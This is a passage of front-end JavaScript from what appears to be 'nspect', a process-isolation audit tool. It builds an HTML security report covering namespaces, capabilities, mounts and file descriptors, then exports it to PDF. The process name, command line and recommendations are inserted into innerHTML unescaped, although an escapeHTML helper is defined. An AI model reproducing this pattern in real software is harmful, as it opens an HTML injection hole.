            if (currentReportData.mounts && currentReportData.mounts.recommendations) allRecs.push(...currentReportData.mounts.recommendations);
            if (currentReportData.filesystem && currentReportData.filesystem.recommendations) allRecs.push(...currentReportData.filesystem.recommendations);
            
            allRecs.forEach((r, idx) => {
                secRecs += '<li style="margin-bottom:10px;line-height:1.4"><b>' + (idx+1) + '.</b> ' + r + '</li>';
            });
            if (secRecs === '') {
                secRecs = '<li>No security remediation recommendations required.</li>';
            }

            // Score Badge styling for PDF
            let colorHex = '#16a34a'; // Green
            if (currentReportData.overall_score < 50) colorHex = '#dc2626'; // Red
            else if (currentReportData.overall_score < 80) colorHex = '#d97706'; // Amber

            element.innerHTML = '<div style="border-bottom:3px solid #3b82f6;padding-bottom:15px;margin-bottom:25px"><div style="display:flex;justify-content:space-between;align-items:center"><h1 style="margin:0;font-size:24px;color:#1e3a8a">nspect security report</h1><div style="background-color:' + colorHex + ';color:#ffffff;padding:10px 20px;border-radius:8px;text-align:center"><div style="font-size:20px;font-weight:bold">' + currentReportData.overall_score + '/100</div><div style="font-size:10px;text-transform:uppercase;letter-spacing:1px">Security Score</div></div></div><div style="margin-top:10px;font-size:12px;color:#6b7280">Generated dynamically on: ' + formattedDate + '</div></div><div style="background-color:#f3f4f6;padding:15px;border-radius:8px;margin-bottom:25px;font-size:13px"><h2 style="margin-top:0;font-size:15px;color:#1e293b">Target Specification</h2><table style="width:100%;border-collapse:collapse"><tr><td style="width:140px;font-weight:bold;padding:4px 0">Process Name:</td><td style="padding:4px 0">' + currentReportData.process_name + '</td></tr><tr><td style="font-weight:bold;padding:4px 0">PID:</td><td style="padding:4px 0">' + currentReportData.pid + '</td></tr><tr><td style="font-weight:bold;padding:4px 0">Command Line:</td><td style="padding:4px 0;font-family:monospace;font-size:11px">' + (currentReportData.cmdline || '[No arguments]') + '</td></tr></table></div><h2 style="font-size:16px;color:#1e3a8a;border-bottom:1px solid #bfdbfe;padding-bottom:5px;margin-top:30px">1. Namespace Isolation Summary</h2><table style="width:100%;border-collapse:collapse;margin-top:10px;font-size:12px"><thead><tr style="background-color:#f9fafb;text-align:left;border-bottom:2px solid #e5e7eb"><th style="padding:8px">Namespace</th><th style="padding:8px">Isolation</th><th style="padding:8px">Namespace Inode</th><th style="padding:8px">Risk Analysis</th></tr></thead><tbody>' + nsRows + '</tbody></table><h2 style="font-size:16px;color:#1e3a8a;border-bottom:1px solid #bfdbfe;padding-bottom:5px;margin-top:30px">2. Capabilities Audit Findings</h2><table style="width:100%;border-collapse:collapse;margin-top:10px;font-size:12px"><thead><tr style="background-color:#f9fafb;text-align:left;border-bottom:2px solid #e5e7eb"><th style="padding:8px">Capability</th><th style="padding:8px">Risk Level</th><th style="padding:8px">Security Impact</th></tr></thead><tbody>' + capRows + '</tbody></table><div style="page-break-before: always;"></div><h2 style="font-size:16px;color:#1e3a8a;border-bottom:1px solid #bfdbfe;padding-bottom:5px;margin-top:20px">3. Mount Point Volume Exposures</h2><table style="width:100%;border-collapse:collapse;margin-top:10px;font-size:12px"><thead><tr style="background-color:#f9fafb;text-align:left;border-bottom:2px solid #e5e7eb"><th style="padding:8px">Mountpoint</th><th style="padding:8px">Source Path</th><th style="padding:8px">Risk Level</th><th style="padding:8px">Risk Context</th></tr></thead><tbody>' + mountRows + '</tbody></table><h2 style="font-size:16px;color:#1e3a8a;border-bottom:1px solid #bfdbfe;padding-bottom:5px;margin-top:30px">4. Filesystem Risks & File Descriptors</h2><table style="width:100%;border-collapse:collapse;margin-top:10px;font-size:12px"><thead><tr style="background-color:#f9fafb;text-align:left;border-bottom:2px solid #e5e7eb"><th style="padding:8px">Path</th><th style="padding:8px">Risk Level</th><th style="padding:8px">Violation Context</th></tr></thead><tbody>' + fsRows + '</tbody></table><h3 style="font-size:14px;color:#1e3a8a;margin-top:20px">Open File Descriptor Leaks</h3><table style="width:100%;border-collapse:collapse;margin-top:10px;font-size:12px"><thead><tr style="background-color:#f9fafb;text-align:left;border-bottom:2px solid #e5e7eb"><th style="padding:8px">FD No</th><th style="padding:8px">Type</th><th style="padding:8px">Target Path / Connection</th><th style="padding:8px">Risk Context</th></tr></thead><tbody>' + fdRows + '</tbody></table><h2 style="font-size:16px;color:#1e3a8a;border-bottom:1px solid #bfdbfe;padding-bottom:5px;margin-top:30px">5. Recommended Remediation & Hardening Roadmap</h2><ul style="padding-left:20px;font-size:13px;color:#374151">' + secRecs + '</ul>';

            const opt = {
                margin:       [0.5, 0.5, 0.5, 0.5],
                filename:     'nspect_report_' + currentReportData.pid + '.pdf',
                image:        { type: 'jpeg', quality: 0.98 },
                html2canvas:  { scale: 2, useCORS: true, backgroundColor: '#ffffff' },
                jsPDF:        { unit: 'in', format: 'letter', orientation: 'portrait' }
            };

            html2pdf().set(opt).from(element).save().then(() => {
                btn.innerHTML = originalText;
                btn.disabled = false;
            }).catch(err => {
                console.error(err);
                btn.innerHTML = originalText;
                btn.disabled = false;
                alert('Failed to generate PDF. You can save/print the page directly via browser Ctrl+P.');
            });
        }

        // Helper to encode HTML characters safely
        function escapeHTML(str) {
            if (!str) return '';
            return str
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#039;');
        }
    </script>
</body>
</html>
`;
